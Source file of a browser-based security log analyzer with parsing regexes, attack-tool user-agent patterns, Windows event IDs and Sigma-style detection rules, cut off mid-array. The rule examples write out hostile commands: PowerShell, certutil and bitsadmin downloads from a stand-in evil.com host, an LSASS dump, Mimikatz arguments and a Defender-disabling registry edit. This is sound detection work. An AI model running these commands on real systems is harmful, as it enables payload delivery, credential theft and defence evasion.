// Darknode Log Analyzer -- full security log analysis toolkit
// No frameworks, vanilla JS only

/* ============================================================
   SECTION 1: DATA / CONSTANTS
   ============================================================ */

const APACHE_COMBINED_RE = /^(\S+) (\S+) (\S+) \[([^\]]+)\] "([A-Z]+) ([^\s"]+)\s*([^"]*)" (\d{3}) (\d+|-) "([^"]*)" "([^"]*)"/;
const APACHE_COMMON_RE = /^(\S+) (\S+) (\S+) \[([^\]]+)\] "([A-Z]+) ([^\s"]+)\s*([^"]*)" (\d{3}) (\d+|-)/;
const APACHE_ERROR_RE = /^\[([^\]]+)\] \[([^\]]+)\] (?:\[([^\]]+)\] )?(.+)/;
const NGINX_ERROR_RE = /^(\d{4}\/\d{2}\/\d{2} \d{2}:\d{2}:\d{2}) \[(\w+)\] (\d+)#(\d+): (.+)/;
const SYSLOG_RFC3164_RE = /^<(\d+)>(\w{3}\s+\d+\s+\d{2}:\d{2}:\d{2}) (\S+) (\S+?)(?:\[(\d+)\])?: (.+)/;
const SYSLOG_RFC5424_RE = /^<(\d+)>(\d+) (\S+) (\S+) (\S+) (\S+) (\S+) (?:\[([^\]]*)\])?\s*(.*)/;
const AUTH_FAILED_RE = /(?:Failed password|authentication failure|Access denied|Invalid user|FAILED LOGIN)/i;
const AUTH_SUCCESS_RE = /(?:Accepted password|Accepted publickey|session opened|Successful login)/i;
const SUDO_RE = /sudo[:\[].*(?:COMMAND|USER|TTY)/i;
const BRUTE_RE = /(?:Failed password|authentication failure)/i;

const IPV4_RE = /\b(?:(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\.){3}(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\b/g;
const IPV6_RE = /\b(?:[0-9a-fA-F]{1,4}:){2,7}[0-9a-fA-F]{1,4}\b/g;
const DOMAIN_RE = /\b(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}\b/g;
const URL_RE = /https?:\/\/[^\s"'<>]+/g;
const EMAIL_RE = /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/g;
const MD5_RE = /\b[a-fA-F0-9]{32}\b/g;
const SHA1_RE = /\b[a-fA-F0-9]{40}\b/g;
const SHA256_RE = /\b[a-fA-F0-9]{64}\b/g;

const SYSLOG_FACILITIES = [
  'kern', 'user', 'mail', 'daemon', 'auth', 'syslog', 'lpr', 'news',
  'uucp', 'cron', 'authpriv', 'ftp', 'ntp', 'audit', 'alert', 'clock',
  'local0', 'local1', 'local2', 'local3', 'local4', 'local5', 'local6', 'local7'
];

const SYSLOG_SEVERITIES = [
  'Emergency', 'Alert', 'Critical', 'Error', 'Warning', 'Notice', 'Informational', 'Debug'
];

const HTTP_STATUS_MAP = {
  200: 'OK', 201: 'Created', 204: 'No Content', 206: 'Partial Content',
  301: 'Moved Permanently', 302: 'Found', 304: 'Not Modified', 307: 'Temporary Redirect', 308: 'Permanent Redirect',
  400: 'Bad Request', 401: 'Unauthorized', 403: 'Forbidden', 404: 'Not Found',
  405: 'Method Not Allowed', 408: 'Request Timeout', 413: 'Payload Too Large',
  414: 'URI Too Long', 429: 'Too Many Requests', 431: 'Headers Too Large',
  500: 'Internal Server Error', 502: 'Bad Gateway', 503: 'Service Unavailable', 504: 'Gateway Timeout'
};

const KNOWN_USER_AGENTS = [
  { pattern: /sqlmap/i, label: 'sqlmap (SQL Injection Tool)', category: 'attack-tool' },
  { pattern: /nikto/i, label: 'Nikto (Web Scanner)', category: 'attack-tool' },
  { pattern: /nmap/i, label: 'Nmap (Port Scanner)', category: 'attack-tool' },
  { pattern: /masscan/i, label: 'Masscan (Port Scanner)', category: 'attack-tool' },
  { pattern: /dirbuster/i, label: 'DirBuster (Directory Scanner)', category: 'attack-tool' },
  { pattern: /gobuster/i, label: 'GoBuster (Directory Scanner)', category: 'attack-tool' },
  { pattern: /wfuzz/i, label: 'wfuzz (Web Fuzzer)', category: 'attack-tool' },
  { pattern: /ffuf/i, label: 'ffuf (Web Fuzzer)', category: 'attack-tool' },
  { pattern: /hydra/i, label: 'Hydra (Brute Force Tool)', category: 'attack-tool' },
  { pattern: /burp/i, label: 'Burp Suite (Web Proxy)', category: 'attack-tool' },
  { pattern: /zaproxy|owasp\s*zap/i, label: 'OWASP ZAP (Web Scanner)', category: 'attack-tool' },
  { pattern: /w3af/i, label: 'w3af (Web Scanner)', category: 'attack-tool' },
  { pattern: /arachni/i, label: 'Arachni (Web Scanner)', category: 'attack-tool' },
  { pattern: /metasploit/i, label: 'Metasploit (Exploitation Framework)', category: 'attack-tool' },
  { pattern: /acunetix/i, label: 'Acunetix (Web Scanner)', category: 'attack-tool' },
  { pattern: /nessus/i, label: 'Nessus (Vulnerability Scanner)', category: 'attack-tool' },
  { pattern: /openvas/i, label: 'OpenVAS (Vulnerability Scanner)', category: 'attack-tool' },
  { pattern: /nuclei/i, label: 'Nuclei (Scanner)', category: 'attack-tool' },
  { pattern: /whatweb/i, label: 'WhatWeb (Web Fingerprint)', category: 'attack-tool' },
  { pattern: /wpscan/i, label: 'WPScan (WordPress Scanner)', category: 'attack-tool' },
  { pattern: /joomscan/i, label: 'JoomScan (Joomla Scanner)', category: 'attack-tool' },
  { pattern: /droopescan/i, label: 'Droopescan (CMS Scanner)', category: 'attack-tool' },
  { pattern: /commix/i, label: 'Commix (Command Injection)', category: 'attack-tool' },
  { pattern: /xsstrike/i, label: 'XSStrike (XSS Scanner)', category: 'attack-tool' },
  { pattern: /dalfox/i, label: 'Dalfox (XSS Scanner)', category: 'attack-tool' },
  { pattern: /curl/i, label: 'curl', category: 'cli-tool' },
  { pattern: /wget/i, label: 'wget', category: 'cli-tool' },
  { pattern: /python-requests/i, label: 'Python Requests', category: 'library' },
  { pattern: /python-urllib/i, label: 'Python urllib', category: 'library' },
  { pattern: /axios/i, label: 'Axios (JS HTTP Client)', category: 'library' },
  { pattern: /go-http-client/i, label: 'Go HTTP Client', category: 'library' },
  { pattern: /java\//i, label: 'Java HTTP Client', category: 'library' },
  { pattern: /Googlebot/i, label: 'Googlebot', category: 'search-bot' },
  { pattern: /bingbot/i, label: 'Bingbot', category: 'search-bot' },
  { pattern: /Slurp/i, label: 'Yahoo Slurp', category: 'search-bot' },
  { pattern: /DuckDuckBot/i, label: 'DuckDuckBot', category: 'search-bot' },
  { pattern: /Baiduspider/i, label: 'Baiduspider', category: 'search-bot' },
  { pattern: /YandexBot/i, label: 'YandexBot', category: 'search-bot' },
  { pattern: /facebot|facebookexternalhit/i, label: 'Facebook Bot', category: 'social-bot' },
  { pattern: /Twitterbot/i, label: 'Twitter Bot', category: 'social-bot' },
  { pattern: /LinkedInBot/i, label: 'LinkedIn Bot', category: 'social-bot' },
  { pattern: /Slackbot/i, label: 'Slackbot', category: 'social-bot' },
  { pattern: /Chrome\/\d/i, label: 'Google Chrome', category: 'browser' },
  { pattern: /Firefox\/\d/i, label: 'Mozilla Firefox', category: 'browser' },
  { pattern: /Safari\/\d.*(?!Chrome)/i, label: 'Apple Safari', category: 'browser' },
  { pattern: /Edg\/\d/i, label: 'Microsoft Edge', category: 'browser' },
  { pattern: /OPR\/\d|Opera/i, label: 'Opera', category: 'browser' },
  { pattern: /MSIE|Trident/i, label: 'Internet Explorer', category: 'browser' },
];

const WINDOWS_EVENTS = [
  { id: 1102, source: 'Security', description: 'The audit log was cleared', severity: 'high', category: 'Log Management' },
  { id: 4608, source: 'Security', description: 'Windows is starting up', severity: 'info', category: 'System' },
  { id: 4609, source: 'Security', description: 'Windows is shutting down', severity: 'info', category: 'System' },
  { id: 4610, source: 'Security', description: 'An authentication package has been loaded by the LSA', severity: 'medium', category: 'Authentication' },
  { id: 4611, source: 'Security', description: 'A trusted logon process has been registered with the LSA', severity: 'medium', category: 'Authentication' },
  { id: 4614, source: 'Security', description: 'A notification package has been loaded by the SAM', severity: 'medium', category: 'Authentication' },
  { id: 4616, source: 'Security', description: 'The system time was changed', severity: 'high', category: 'System' },
  { id: 4618, source: 'Security', description: 'A monitored security event pattern has occurred', severity: 'high', category: 'System' },
  { id: 4621, source: 'Security', description: 'Administrator recovered system from CrashOnAuditFail', severity: 'high', category: 'System' },
  { id: 4622, source: 'Security', description: 'A security package has been loaded by the LSA', severity: 'medium', category: 'Authentication' },
  { id: 4624, source: 'Security', description: 'An account was successfully logged on', severity: 'info', category: 'Logon/Logoff' },
  { id: 4625, source: 'Security', description: 'An account failed to log on', severity: 'medium', category: 'Logon/Logoff' },
  { id: 4626, source: 'Security', description: 'User/Device claims information', severity: 'info', category: 'Logon/Logoff' },
  { id: 4627, source: 'Security', description: 'Group membership information', severity: 'info', category: 'Logon/Logoff' },
  { id: 4634, source: 'Security', description: 'An account was logged off', severity: 'info', category: 'Logon/Logoff' },
  { id: 4647, source: 'Security', description: 'User initiated logoff', severity: 'info', category: 'Logon/Logoff' },
  { id: 4648, source: 'Security', description: 'A logon was attempted using explicit credentials', severity: 'medium', category: 'Logon/Logoff' },
  { id: 4649, source: 'Security', description: 'A replay attack was detected', severity: 'critical', category: 'Authentication' },
  { id: 4657, source: 'Security', description: 'A registry value was modified', severity: 'medium', category: 'Object Access' },
  { id: 4663, source: 'Security', description: 'An attempt was made to access an object', severity: 'info', category: 'Object Access' },
  { id: 4670, source: 'Security', description: 'Permissions on an object were changed', severity: 'medium', category: 'Object Access' },
  { id: 4672, source: 'Security', description: 'Special privileges assigned to new logon', severity: 'medium', category: 'Logon/Logoff' },
  { id: 4673, source: 'Security', description: 'A privileged service was called', severity: 'medium', category: 'Privilege Use' },
  { id: 4674, source: 'Security', description: 'An operation was attempted on a privileged object', severity: 'medium', category: 'Privilege Use' },
  { id: 4688, source: 'Security', description: 'A new process has been created', severity: 'info', category: 'Process Tracking' },
  { id: 4689, source: 'Security', description: 'A process has exited', severity: 'info', category: 'Process Tracking' },
  { id: 4690, source: 'Security', description: 'An attempt was made to duplicate a handle to an object', severity: 'info', category: 'Object Access' },
  { id: 4691, source: 'Security', description: 'Indirect access to an object was requested', severity: 'info', category: 'Object Access' },
  { id: 4692, source: 'Security', description: 'Backup of data protection master key was attempted', severity: 'medium', category: 'DPAPI' },
  { id: 4693, source: 'Security', description: 'Recovery of data protection master key was attempted', severity: 'medium', category: 'DPAPI' },
  { id: 4694, source: 'Security', description: 'Protection of auditable protected data was attempted', severity: 'medium', category: 'DPAPI' },
  { id: 4695, source: 'Security', description: 'Unprotection of auditable protected data was attempted', severity: 'medium', category: 'DPAPI' },
  { id: 4696, source: 'Security', description: 'A primary token was assigned to process', severity: 'medium', category: 'Process Tracking' },
  { id: 4697, source: 'Security', description: 'A service was installed in the system', severity: 'high', category: 'System' },
  { id: 4698, source: 'Security', description: 'A scheduled task was created', severity: 'medium', category: 'Task Scheduler' },
  { id: 4699, source: 'Security', description: 'A scheduled task was deleted', severity: 'medium', category: 'Task Scheduler' },
  { id: 4700, source: 'Security', description: 'A scheduled task was enabled', severity: 'medium', category: 'Task Scheduler' },
  { id: 4701, source: 'Security', description: 'A scheduled task was disabled', severity: 'info', category: 'Task Scheduler' },
  { id: 4702, source: 'Security', description: 'A scheduled task was updated', severity: 'medium', category: 'Task Scheduler' },
  { id: 4703, source: 'Security', description: 'A token right was adjusted', severity: 'medium', category: 'Privilege Use' },
  { id: 4704, source: 'Security', description: 'A user right was assigned', severity: 'high', category: 'Policy Change' },
  { id: 4705, source: 'Security', description: 'A user right was removed', severity: 'medium', category: 'Policy Change' },
  { id: 4706, source: 'Security', description: 'A new trust was created to a domain', severity: 'high', category: 'Policy Change' },
  { id: 4707, source: 'Security', description: 'A trust to a domain was removed', severity: 'high', category: 'Policy Change' },
  { id: 4713, source: 'Security', description: 'Kerberos policy was changed', severity: 'high', category: 'Policy Change' },
  { id: 4714, source: 'Security', description: 'Encrypted data recovery policy was changed', severity: 'high', category: 'Policy Change' },
  { id: 4715, source: 'Security', description: 'The audit policy on an object was changed', severity: 'high', category: 'Policy Change' },
  { id: 4716, source: 'Security', description: 'Trusted domain information was modified', severity: 'high', category: 'Policy Change' },
  { id: 4717, source: 'Security', description: 'System security access was granted to an account', severity: 'high', category: 'Policy Change' },
  { id: 4718, source: 'Security', description: 'System security access was removed from an account', severity: 'medium', category: 'Policy Change' },
  { id: 4719, source: 'Security', description: 'System audit policy was changed', severity: 'high', category: 'Policy Change' },
  { id: 4720, source: 'Security', description: 'A user account was created', severity: 'medium', category: 'Account Management' },
  { id: 4722, source: 'Security', description: 'A user account was enabled', severity: 'medium', category: 'Account Management' },
  { id: 4723, source: 'Security', description: 'An attempt was made to change an accounts password', severity: 'medium', category: 'Account Management' },
  { id: 4724, source: 'Security', description: 'An attempt was made to reset an accounts password', severity: 'medium', category: 'Account Management' },
  { id: 4725, source: 'Security', description: 'A user account was disabled', severity: 'medium', category: 'Account Management' },
  { id: 4726, source: 'Security', description: 'A user account was deleted', severity: 'high', category: 'Account Management' },
  { id: 4727, source: 'Security', description: 'A security-enabled global group was created', severity: 'medium', category: 'Account Management' },
  { id: 4728, source: 'Security', description: 'A member was added to a security-enabled global group', severity: 'medium', category: 'Account Management' },
  { id: 4729, source: 'Security', description: 'A member was removed from a security-enabled global group', severity: 'medium', category: 'Account Management' },
  { id: 4730, source: 'Security', description: 'A security-enabled global group was deleted', severity: 'high', category: 'Account Management' },
  { id: 4731, source: 'Security', description: 'A security-enabled local group was created', severity: 'medium', category: 'Account Management' },
  { id: 4732, source: 'Security', description: 'A member was added to a security-enabled local group', severity: 'medium', category: 'Account Management' },
  { id: 4733, source: 'Security', description: 'A member was removed from a security-enabled local group', severity: 'medium', category: 'Account Management' },
  { id: 4734, source: 'Security', description: 'A security-enabled local group was deleted', severity: 'high', category: 'Account Management' },
  { id: 4735, source: 'Security', description: 'A security-enabled local group was changed', severity: 'medium', category: 'Account Management' },
  { id: 4737, source: 'Security', description: 'A security-enabled global group was changed', severity: 'medium', category: 'Account Management' },
  { id: 4738, source: 'Security', description: 'A user account was changed', severity: 'medium', category: 'Account Management' },
  { id: 4739, source: 'Security', description: 'Domain Policy was changed', severity: 'high', category: 'Policy Change' },
  { id: 4740, source: 'Security', description: 'A user account was locked out', severity: 'high', category: 'Account Management' },
  { id: 4741, source: 'Security', description: 'A computer account was created', severity: 'medium', category: 'Account Management' },
  { id: 4742, source: 'Security', description: 'A computer account was changed', severity: 'medium', category: 'Account Management' },
  { id: 4743, source: 'Security', description: 'A computer account was deleted', severity: 'high', category: 'Account Management' },
  { id: 4756, source: 'Security', description: 'A member was added to a security-enabled universal group', severity: 'medium', category: 'Account Management' },
  { id: 4757, source: 'Security', description: 'A member was removed from a security-enabled universal group', severity: 'medium', category: 'Account Management' },
  { id: 4764, source: 'Security', description: 'A groups type was changed', severity: 'medium', category: 'Account Management' },
  { id: 4767, source: 'Security', description: 'A user account was unlocked', severity: 'info', category: 'Account Management' },
  { id: 4768, source: 'Security', description: 'A Kerberos authentication ticket (TGT) was requested', severity: 'info', category: 'Kerberos' },
  { id: 4769, source: 'Security', description: 'A Kerberos service ticket was requested', severity: 'info', category: 'Kerberos' },
  { id: 4770, source: 'Security', description: 'A Kerberos service ticket was renewed', severity: 'info', category: 'Kerberos' },
  { id: 4771, source: 'Security', description: 'Kerberos pre-authentication failed', severity: 'medium', category: 'Kerberos' },
  { id: 4776, source: 'Security', description: 'The DC attempted to validate the credentials for an account', severity: 'info', category: 'Authentication' },
  { id: 4778, source: 'Security', description: 'A session was reconnected to a Window Station', severity: 'info', category: 'Logon/Logoff' },
  { id: 4779, source: 'Security', description: 'A session was disconnected from a Window Station', severity: 'info', category: 'Logon/Logoff' },
  { id: 4781, source: 'Security', description: 'The name of an account was changed', severity: 'medium', category: 'Account Management' },
  { id: 4798, source: 'Security', description: 'A users local group membership was enumerated', severity: 'info', category: 'Account Management' },
  { id: 4799, source: 'Security', description: 'A security-enabled local group membership was enumerated', severity: 'info', category: 'Account Management' },
  { id: 4800, source: 'Security', description: 'The workstation was locked', severity: 'info', category: 'Logon/Logoff' },
  { id: 4801, source: 'Security', description: 'The workstation was unlocked', severity: 'info', category: 'Logon/Logoff' },
  { id: 4802, source: 'Security', description: 'The screen saver was invoked', severity: 'info', category: 'Logon/Logoff' },
  { id: 4803, source: 'Security', description: 'The screen saver was dismissed', severity: 'info', category: 'Logon/Logoff' },
  { id: 4825, source: 'Security', description: 'A user was denied the access to Remote Desktop', severity: 'medium', category: 'Logon/Logoff' },
  { id: 4946, source: 'Security', description: 'A change has been made to Windows Firewall exception list: a rule was added', severity: 'medium', category: 'Firewall' },
  { id: 4947, source: 'Security', description: 'A change has been made to Windows Firewall exception list: a rule was modified', severity: 'medium', category: 'Firewall' },
  { id: 4948, source: 'Security', description: 'A change has been made to Windows Firewall exception list: a rule was deleted', severity: 'medium', category: 'Firewall' },
  { id: 4950, source: 'Security', description: 'A Windows Firewall setting has changed', severity: 'medium', category: 'Firewall' },
  { id: 4954, source: 'Security', description: 'Windows Firewall Group Policy settings have changed', severity: 'medium', category: 'Firewall' },
  { id: 4964, source: 'Security', description: 'Special groups have been assigned to a new logon', severity: 'high', category: 'Logon/Logoff' },
  { id: 5024, source: 'Security', description: 'The Windows Firewall Service has started successfully', severity: 'info', category: 'Firewall' },
  { id: 5025, source: 'Security', description: 'The Windows Firewall Service has been stopped', severity: 'high', category: 'Firewall' },
  { id: 5031, source: 'Security', description: 'The Windows Firewall Service blocked an application from accepting incoming connections', severity: 'medium', category: 'Firewall' },
  { id: 5136, source: 'Security', description: 'A directory service object was modified', severity: 'medium', category: 'Directory Service' },
  { id: 5137, source: 'Security', description: 'A directory service object was created', severity: 'medium', category: 'Directory Service' },
  { id: 5138, source: 'Security', description: 'A directory service object was undeleted', severity: 'medium', category: 'Directory Service' },
  { id: 5139, source: 'Security', description: 'A directory service object was moved', severity: 'medium', category: 'Directory Service' },
  { id: 5140, source: 'Security', description: 'A network share object was accessed', severity: 'info', category: 'Object Access' },
  { id: 5142, source: 'Security', description: 'A network share object was added', severity: 'medium', category: 'Object Access' },
  { id: 5144, source: 'Security', description: 'A network share object was deleted', severity: 'medium', category: 'Object Access' },
  { id: 5145, source: 'Security', description: 'A network share object was checked to see whether client can be granted desired access', severity: 'info', category: 'Object Access' },
  { id: 5152, source: 'Security', description: 'The Windows Filtering Platform blocked a packet', severity: 'info', category: 'Firewall' },
  { id: 5156, source: 'Security', description: 'The Windows Filtering Platform has allowed a connection', severity: 'info', category: 'Firewall' },
  { id: 5157, source: 'Security', description: 'The Windows Filtering Platform has blocked a connection', severity: 'info', category: 'Firewall' },
  { id: 7045, source: 'System', description: 'A service was installed in the system', severity: 'high', category: 'System' },
];

const SIGMA_RULES = [
  {
    title: 'Mimikatz Usage Detected',
    id: 'sigma-001',
    level: 'critical',
    description: 'Detects the use of Mimikatz credential dumping tool based on process creation events.',
    logsource: 'Windows Security / Sysmon',
    detection: 'Process name contains "mimikatz" or command line contains "sekurlsa::logonpasswords" or "lsadump::sam" or "privilege::debug"',
    falsepositives: 'Legitimate penetration testing activities',
    tags: ['attack.credential_access', 'attack.t1003'],
    example: 'EventID: 4688 | Process: mimikatz.exe | CommandLine: privilege::debug sekurlsa::logonpasswords'
  },
  {
    title: 'Suspicious PowerShell Download Cradle',
    id: 'sigma-002',
    level: 'high',
    description: 'Detects PowerShell download cradle patterns commonly used in malware delivery.',
    logsource: 'Windows PowerShell / Sysmon',
    detection: 'Command line matches patterns: "IEX(New-Object Net.WebClient).DownloadString" or "Invoke-Expression" with "WebClient" or "DownloadFile" or "DownloadData"',
    falsepositives: 'Legitimate admin scripts using web downloads',
    tags: ['attack.execution', 'attack.t1059.001'],
    example: 'powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'http://evil.com/payload.ps1\')"'
  },
  {
    title: 'Cleared Windows Event Logs',
    id: 'sigma-003',
    level: 'high',
    description: 'Detects clearing of Windows event logs which is a common anti-forensic technique.',
    logsource: 'Windows Security',
    detection: 'EventID 1102 (Security log cleared) or EventID 104 (System log cleared) or command line contains "wevtutil cl" or "Clear-EventLog"',
    falsepositives: 'Legitimate administrative log rotation',
    tags: ['attack.defense_evasion', 'attack.t1070.001'],
    example: 'EventID: 1102 | Subject: DOMAIN\\attacker | Log: Security'
  },
  {
    title: 'Pass the Hash Activity',
    id: 'sigma-004',
    level: 'critical',
    description: 'Detects pass-the-hash lateral movement by looking for NTLM authentication with specific logon characteristics.',
    logsource: 'Windows Security',
    detection: 'EventID 4624, LogonType 9 (NewCredentials), LogonProcessName "seclogo", AuthenticationPackageName "Negotiate"',
    falsepositives: 'Some legitimate admin tools using RunAs with different credentials',
    tags: ['attack.lateral_movement', 'attack.t1550.002'],
    example: 'EventID: 4624 | LogonType: 9 | TargetUserName: administrator | IpAddress: 10.0.0.50'
  },
  {
    title: 'Suspicious Scheduled Task Creation',
    id: 'sigma-005',
    level: 'medium',
    description: 'Detects creation of scheduled tasks often used for persistence by attackers.',
    logsource: 'Windows Security / Task Scheduler',
    detection: 'EventID 4698 (scheduled task created) or process schtasks.exe with /create parameter, especially with /sc onlogon or /sc onstart or /ru SYSTEM',
    falsepositives: 'Software installations and legitimate admin scripts',
    tags: ['attack.persistence', 'attack.t1053.005'],
    example: 'schtasks /create /tn "WindowsUpdate" /tr "C:\\temp\\payload.exe" /sc onlogon /ru SYSTEM'
  },
  {
    title: 'DCSync Attack Detection',
    id: 'sigma-006',
    level: 'critical',
    description: 'Detects DCSync replication requests from non-domain controller machines.',
    logsource: 'Windows Security',
    detection: 'EventID 4662 with properties containing "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" (DS-Replication-Get-Changes) or "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" (DS-Replication-Get-Changes-All) from non-DC sources',
    falsepositives: 'Legitimate domain controller replication',
    tags: ['attack.credential_access', 'attack.t1003.006'],
    example: 'EventID: 4662 | SubjectUserName: attacker | Properties: DS-Replication-Get-Changes-All'
  },
  {
    title: 'Kerberoasting Service Ticket Request',
    id: 'sigma-007',
    level: 'high',
    description: 'Detects Kerberos service ticket requests for SPNs that could indicate Kerberoasting.',
    logsource: 'Windows Security',
    detection: 'EventID 4769 with TicketEncryptionType 0x17 (RC4) and ServiceName not ending with $ and not krbtgt',
    falsepositives: 'Legitimate service ticket requests with RC4 encryption in legacy environments',
    tags: ['attack.credential_access', 'attack.t1558.003'],
    example: 'EventID: 4769 | ServiceName: MSSQLSvc/dbserver.domain.com | TicketEncryptionType: 0x17'
  },
  {
    title: 'Suspicious Service Installation',
    id: 'sigma-008',
    level: 'high',
    description: 'Detects installation of suspicious services that could indicate malware persistence.',
    logsource: 'Windows System',
    detection: 'EventID 7045 (new service installed) where ServiceFileName contains cmd.exe, powershell.exe, or paths in temp directories',
    falsepositives: 'Some legitimate software uses service installation during updates',
    tags: ['attack.persistence', 'attack.t1543.003'],
    example: 'EventID: 7045 | ServiceName: WindowsPerformance | ServiceFileName: cmd.exe /c C:\\temp\\evil.bat'
  },
  {
    title: 'Brute Force Login Attempts',
    id: 'sigma-009',
    level: 'medium',
    description: 'Detects multiple failed login attempts from a single source within a short timeframe.',
    logsource: 'Windows Security / Linux Auth',
    detection: 'More than 10 EventID 4625 (Windows) or "Failed password" (Linux) entries from the same source IP within 5 minutes',
    falsepositives: 'Misconfigured applications, legitimate password reset attempts',
    tags: ['attack.credential_access', 'attack.t1110.001'],
    example: 'Multiple entries: EventID: 4625 | IpAddress: 192.168.1.100 | TargetUserName: admin'
  },
  {
    title: 'LSASS Memory Dump',
    id: 'sigma-010',
    level: 'critical',
    description: 'Detects attempts to dump LSASS process memory for credential extraction.',
    logsource: 'Sysmon / Windows Security',
    detection: 'Process accessing lsass.exe with PROCESS_VM_READ rights, or procdump/comsvcs.dll MiniDump usage targeting lsass',
    falsepositives: 'Antivirus scanning, Windows Error Reporting',
    tags: ['attack.credential_access', 'attack.t1003.001'],
    example: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 672 C:\\temp\\lsass.dmp full'
  },
  {
    title: 'Windows Defender Disabled',
    id: 'sigma-011',
    level: 'high',
    description: 'Detects attempts to disable Windows Defender or modify its configuration to reduce detection.',
    logsource: 'Windows Defender / Registry',
    detection: 'Registry modification to DisableAntiSpyware or DisableRealtimeMonitoring, or PowerShell Set-MpPreference -DisableRealtimeMonitoring $true',
    falsepositives: 'Legitimate enterprise policy changes during software installation',
    tags: ['attack.defense_evasion', 'attack.t1562.001'],
    example: 'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1'
  },
  {
    title: 'Suspicious WMI Execution',
    id: 'sigma-012',
    level: 'medium',
    description: 'Detects WMI command-line execution for remote command execution and lateral movement.',
    logsource: 'Windows Security / Sysmon',
    detection: 'Process creation of wmic.exe with /node: parameter, or wmiprvse.exe spawning cmd.exe or powershell.exe',
    falsepositives: 'Legitimate WMI administrative scripts',
    tags: ['attack.execution', 'attack.t1047'],
    example: 'wmic /node:10.0.0.5 process call create "cmd.exe /c whoami > C:\\temp\\output.txt"'
  },
  {
    title: 'Registry Run Key Modification',
    id: 'sigma-013',
    level: 'medium',
    description: 'Detects modifications to common registry run keys used for persistence.',
    logsource: 'Sysmon / Windows Security',
    detection: 'Registry modification events for HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run or HKCU equivalent, or RunOnce keys',
    falsepositives: 'Legitimate software installation adding startup entries',
    tags: ['attack.persistence', 'attack.t1547.001'],
    example: 'EventID: 13 (Sysmon) | TargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater'
  },
  {
    title: 'Lateral Movement via PsExec',
    id: 'sigma-014',
    level: 'high',
    description: 'Detects PsExec usage for remote command execution on Windows systems.',
    logsource: 'Windows Security / Sysmon',
    detection: 'Service installation of PSEXESVC, or named pipe creation \\\\*\\PSEXESVC, or process creation psexec.exe or psexesvc.exe',
    falsepositives: 'Legitimate PsExec usage by administrators',
    tags: ['attack.lateral_movement', 'attack.t1021.002'],
    example: 'EventID: 7045 | ServiceName: PSEXESVC | ServiceFileName: %SystemRoot%\\PSEXESVC.exe'
  },
  {
    title: 'Suspicious certutil Usage',
    id: 'sigma-015',
    level: 'medium',
    description: 'Detects abuse of certutil.exe for file download or base64 encoding/decoding.',
    logsource: 'Windows Security / Sysmon',
    detection: 'certutil.exe with -urlcache, -decode, -encode, -decodehex flags',
    falsepositives: 'Legitimate certificate management tasks',
    tags: ['attack.defense_evasion', 'attack.t1140'],
    example: 'certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\temp\\payload.exe'
  },
  {
    title: 'Golden Ticket Attack',
    id: 'sigma-016',
    level: 'critical',
    description: 'Detects potential Golden Ticket usage by monitoring for TGT requests with suspicious attributes.',
    logsource: 'Windows Security',
    detection: 'EventID 4768 with unusual ticket options or lifetime, or EventID 4769 from ticket forged with wrong domain SID',
    falsepositives: 'Very rare in normal environments',
    tags: ['attack.credential_access', 'attack.t1558.001'],
    example: 'EventID: 4769 | ServiceName: krbtgt | TicketOptions: 0x40810000 | Anomalous ticket lifetime detected'
  },
  {
    title: 'DLL Search Order Hijacking',
    id: 'sigma-017',
    level: 'medium',
    description: 'Detects DLL search order hijacking by monitoring DLL loads from unusual locations.',
    logsource: 'Sysmon',
    detection: 'Sysmon EventID 7 (Image Loaded) where DLL is loaded from writable directories like temp, downloads, or user profile paths for known system DLLs',
    falsepositives: 'Some portable applications loading their own DLLs',
    tags: ['attack.persistence', 'attack.t1574.001'],
    example: 'EventID: 7 | Image: C:\\Windows\\explorer.exe | ImageLoaded: C:\\Users\\user\\AppData\\version.dll'
  },
  {
    title: 'Suspicious Outbound DNS Query',
    id: 'sigma-018',
    level: 'medium',
    description: 'Detects unusually long DNS queries or queries to suspicious TLDs that may indicate DNS tunneling.',
    logsource: 'DNS Server / Sysmon',
    detection: 'DNS query where hostname length exceeds 50 characters, or query contains base64-like patterns, or excessive queries to single domain',
    falsepositives: 'CDN subdomains and some cloud services use long hostnames',
    tags: ['attack.command_and_control', 'attack.t1071.004'],
    example: 'DNS Query: aGVsbG8gd29ybGQ.data.evil-c2.com'
  },
  {
    title: 'BITS Job Persistence',
    id: 'sigma-019',
    level: 'medium',
    description: 'Detects abuse of Background Intelligent Transfer Service for persistence or file download.',
    logsource: 'Windows Security / Sysmon',
    detection: 'bitsadmin.exe with /transfer, /create, /addfile, /resume, or /SetNotifyCmdLine parameters',
    falsepositives: 'Legitimate BITS usage for Windows Update or SCCM',
    tags: ['attack.persistence', 'attack.t1197'],
    example: 'bitsadmin /transfer myJob /download /priority high http://evil.com/payload.exe C:\\temp\\payload.exe'
  },
  {
    title: 'Process Injection via CreateRemoteThread',
    id: 'sigma-020',
    level: 'high',
    description: 'Detects process injection attempts using CreateRemoteThread API.',
    logsource: 'Sysmon',
    detection: 'Sysmon EventID 8 (CreateRemoteThread) where source process is not a known legitimate injector',
    falsepositives: 'Debugging tools, AV software, some legitimate applications',
    tags: ['attack.defense_evasion', 'attack.t1055.003'],
    example: 'EventID: 8 | SourceImage: C:\\temp\\injector.exe | TargetImage: C:\\Windows\\explorer.exe'
  },
  {
    title: 'Suspicious Network Connection to TOR',
    id: 'sigma-021',
    level: 'high',
    description: 'Detects network connections to known TOR entry/exit nodes or TOR-related ports.',
    logsource: 'Firewall / Sysmon',
    detection: 'Network connection to port 9001, 9030, 9050, 9051, or 9150, or connections to known TOR exit node IP addresses',
    falsepositives: 'Legitimate TOR usage for privacy research',
    tags: ['attack.command_and_control', 'attack.t1090.003'],
    example: 'Sysmon EventID 3: Process tor.exe connecting to 198.51.100.1:9001'
  },
  {
